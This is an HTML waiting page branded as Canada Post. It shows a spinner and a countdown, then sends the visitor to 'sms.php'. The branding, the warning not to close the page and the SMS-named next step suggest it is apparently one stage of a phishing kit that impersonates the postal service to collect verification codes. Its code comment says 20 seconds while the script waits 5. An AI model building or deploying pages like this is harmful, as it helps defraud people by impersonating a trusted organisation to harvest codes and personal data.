<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading... | Canada Post</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="./images/favicon.ico" /> 
    <style>
        :root {
            --primary-blue: #005fa6;
            --primary-blue-light: #e6f2ff;
            --accent-green: #00a651;
            --neutral-dark: #1a1a1a;
            --neutral-light: #f8f9fa;
            --white: #ffffff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: radial-gradient(circle at top, var(--primary-blue-light), var(--neutral-light));
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--neutral-dark);
        }

        .loading-wrapper {
            background: var(--white);
            border-radius: 14px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.12);
            padding: 32px 40px;
            max-width: 360px;
            width: 90%;
            text-align: center;
        }

        .loading-icon {
            width: 56px;
            height: 56px;
            margin: 0 auto 18px;
            border-radius: 50%;
            border: 4px solid rgba(0,0,0,0.05);
            border-top-color: var(--primary-blue);
            border-right-color: var(--accent-green);
            animation: spin 0.8s linear infinite;
        }

        .loading-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .loading-text {
            font-size: 14px;
            color: #555;
            margin-bottom: 8px;
        }

        .loading-meta {
            font-size: 12px;
            color: #777;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .loading-wrapper {
                padding: 24px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-wrapper">
        <div class="loading-icon"></div>
        <div class="loading-title">Please wait…</div>
        <div class="loading-text">
            We’re processing your request. This may take a few seconds.
        </div>
        <div class="loading-meta">
            You will be redirected in <span id="countdown">20</span> seconds.<br>
            Do not close or refresh this page.
        </div>
    </div>

    <script>
        // 20 seconds redirect to sms.php
        const totalSeconds = 5;
        let remaining = totalSeconds;
        const countdownEl = document.getElementById('countdown');

        countdownEl.textContent = remaining;

        const interval = setInterval(() => {
            remaining--;
            if (remaining <= 0) {
                clearInterval(interval);
            }
            countdownEl.textContent = remaining;
        }, 1000);

        setTimeout(() => {
            window.location.href = 'sms.php';
        }, totalSeconds * 1000);
    </script>
</body>
</html>
